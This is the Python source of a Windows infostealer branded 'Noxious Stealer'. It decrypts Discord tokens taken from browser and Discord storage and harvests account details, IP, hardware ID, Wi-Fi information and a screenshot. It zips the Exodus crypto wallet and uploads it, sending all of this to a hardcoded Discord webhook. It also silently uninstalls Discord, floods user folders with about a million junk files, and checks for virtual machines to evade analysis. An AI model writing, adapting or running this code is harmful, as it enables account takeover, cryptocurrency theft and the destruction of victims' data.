import requests
import os
import subprocess
import platform
import winreg as reg
import winreg
import random
import string
import shutil
import json
import zipfile

from winerror           import *
from figgy              import n0x
from datetime           import datetime
from base64             import b64decode
from Crypto.Cipher      import AES
from win32crypt         import CryptUnprotectData
from os                 import getlogin, listdir, getenv
from json               import loads
from re                 import findall
from urllib.request     import Request, urlopen
from subprocess         import Popen, PIPE
from PIL                import ImageGrab

webhook = 'https://discord.com/api/webhooks/1242449496919642182/ZDpsTsLghwBEgcZykC-3yDj3MAxDlDJ3Op_-ghcygrZtWVYvaeXkoZPeABlXRn0T4VF2'

def udscrd():
    try:
        kill_command = 'taskkill /F /IM discord.exe'
        result = subprocess.run(kill_command, capture_output=True, text=True, shell=True)
        find_discord_cmd = 'Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Name LIKE \'%Discord%\'"'
        result = subprocess.run(['powershell', '-Command', find_discord_cmd], capture_output=True, text=True)
        
        if 'Discord' in result.stdout:
            product_code = None
            for line in result.stdout.split('\n'):
                if "IdentifyingNumber" in line:
                    product_code = line.split(' ')[-1].strip()
                    break
            
            if product_code:
                uninstall_cmd = f'Msiexec /x {product_code} /quiet'
                uninstall_result = subprocess.run(['powershell', '-Command', uninstall_cmd], capture_output=True, text=True)
                
                if uninstall_result.returncode == 0:
                    pass
                else:
                    pass
            else:
                pass
        else:
            pass
    
    except Exception as e:
        pass

def troll(directory):
    for _ in range(1000):
        for _ in range(1000):
            random_filename = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.txt'
            with open(os.path.join(directory, random_filename), 'w', encoding='utf-8') as f:
                f.write(generate_japanese_text())

def generate_japanese_text():
    japanese_letters = ''.join(chr(random.randint(0x3041, 0x3096)) for _ in range(100000))
    return japanese_letters

def dir():
    user_home = os.path.expanduser('~')
    desktop_dir = os.path.join(user_home, 'Desktop')
    downloads_dir = os.path.join(user_home, 'Downloads')
    pictures_dir = os.path.join(user_home, 'Pictures')
    videos_dir = os.path.join(user_home, 'Videos')

    for directory in [desktop_dir, downloads_dir, pictures_dir, videos_dir]:
        if platform.system() == 'Windows':
            troll(directory)
        else:
            pass

def send_embed(embed):
    payload = {"embeds": [embed]}
    response = requests.post(webhook, json=payload)
    if response.status_code != 200:
        pass

def check_vm():
    vm_processes = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe"]
    vm_drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmci.sys", "vmx_svga.sys"]
    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]

    return detected_processes, detected_drivers

def check_registry_key(key):
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
            return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(e)
        return False

pc_username = os.getlogin()
pc_name = platform.node()
platform_name = platform.system()
detected_processes, detected_driver = check_vm()
antivm = {
    "title": pc_username,
    "color": 0x000000,
    "author": {
        "name": "Virtual Machine Detected / Virus Total Scan ",
        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
    },
    "footer": {
        "text": "VM Protection | https://github.com/Api14"
    },
    "fields": [
        {"name": "PC Information", "value": f"<a:egptick:798084594552537099> PC Name: `{pc_name}`\n<a:egptick:798084594552537099> Username: `{pc_username}`\n<a:egptick:798084594552537099> Platform: `{platform_name}`", "inline": False},
        {"name": "Virtual Machine", "value": "True", "inline": False},
        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
        {"name": "Detected Drivers", "value": "\n".join(detected_driver) if detected_driver else "None", "inline": False}
    ]
}
send_embed(antivm)

def wif():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            return "Error: Unable to retrieve Wi-Fi information."
    except Exception as e:
        return f"Error: {str(e)}"


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def fig():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_nox():
    already_check = []
    checker = []
    cleaned = []
    nox = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                nox.append(values)
                except PermissionError: continue
        for i in nox:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = fig()
                        pc_username = getenv("UserName")
                        pc_name = getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = {
                            "title": user_name,
                            "color": 0x000000,
                            "author": {
                                "name": "Noxious v1 - Made by api",
                                "icon_url": "https://cdn.discordapp.com/attachments/1229552814683062336/1236400257470959796/aliens.png?"
                            },
                            "footer": {
                                "text": "Dev api | https://github.com/Api14"
                            },
                            "fields": [
                                {"name": "User ID", "value": user_id, "inline": True},
                                {"name": "Account Information", "value": f"<a:blackdiamond:856110506670161930> Email: `{email}`\n<a:blackdiamond:856110506670161930> Phone: `{phone}`\n<a:blackdiamond:856110506670161930> 2FA/MFA Enabled: `{mfa_enabled}`\n<a:blackdiamond:856110506670161930> Nitro: `{has_nitro}`\n<a:blackdiamond:856110506670161930> Expires in: `{days_left if days_left else 'None'} day(s)`", "inline": False},
                                {"name": "PC Information", "value": f"<a:blackdiamond:856110506670161930> IP: `{ip}`\n<a:blackdiamond:856110506670161930> Username: `{pc_username}`\n<a:blackdiamond:856110506670161930> PC Name: `{pc_name}`\n<a:blackdiamond:856110506670161930> Platform: `{platform}`", "inline": False},
                                {"name": "Token", "value": f"||{tok}||", "inline": False}
                            ]
                        }
                        payload = {
                            "embeds": [embed]
                        }
                        try:
                            res = requests.post(f'{webhook}', json=payload, headers=headers)
                            if res.status_code == 204:
                                pass
                        except Exception as e:
                            pass
                else: continue
    
    con_info = wif()
    con_embed = {
        "title": "**Wi-Fi Information**",
        "color": 0x000000,
        "fields": [
            {"name": "<a:blackdiamond:856110506670161930> **Wi-Fi Info**", "value": f"```js{con_info}```", "inline": False}
        ]
    }
    con_payload = {
        "embeds": [con_embed]
    }
    con_res = requests.post(f'{webhook}', json=con_payload)
    if con_res.status_code == 204:
        pass

    screenshot = ImageGrab.grab()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    screenshot_embed = {
        "title": "**Screenshot**",
        "color": 0x000000,
        "image": {
            "url": "attachment://" + screenshot_path
        }
    }
    screenshot_payload = {
        "embeds": [screenshot_embed]
    }
    screenshot_files = {
        "file": open(screenshot_path, "rb")
    }
    screenshot_res = requests.post(f'{webhook}', json=screenshot_payload, files=screenshot_files)
    if screenshot_res.status_code == 204:
        pass


class Exodus:
    def __init__(self):
        self.amountfiles = 0
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(os.path.join(self.path, "exodus.wallet"))
        except Exception as e:
            print(f"Error: {e}")

    def stealexo(self, path):
        exopath = os.path.join(os.getcwd(), "Exodus")
        os.mkdir(exopath)
        P = os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(os.path.join(path, i), os.path.join(exopath, i))
        zip_path = os.path.join(os.getcwd(), "Exodus.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(exopath):
                for file in files:
                    zip_file.write(os.path.join(root, file))
        with open(zip_path, "rb") as file:
            with open(zip_path, "rb") as file:
                 response = requests.post("https://store2.gofile.io/uploadFile", files={"file": file})
            if response.ok:
                download = response.json()["data"]["file"]["url"]["short"]
                files_str = "\n".join([f"  |_ {file}" for file in os.listdir(exopath)])
                embed = {
                    "title": "Exodus Log Files",
                    "description": f"```\nExodus\n|_ Exodus Log Files\n{files_str}\n```",
                    "color": 13290186,
                    "url": download
                }
                payload = {
                    "username": "Noxious Stealer",
                    "avatar_url": "",
                    "embeds": [embed]
                }
                headers = {'Content-Type': 'application/json'}
                requests.post(webhook, headers=headers, data=json.dumps(payload))
        shutil.rmtree("Exodus")
        os.remove("Exodus.zip")


if __name__ == '__main__':
    if detected_processes == True:
        send_embed()
    if detected_processes == False:
        udscrd()
        get_nox()
        n0x(webhook)
        os.remove("screenshot.png")
        dir()
        spam_error_boxes()
        Exodus()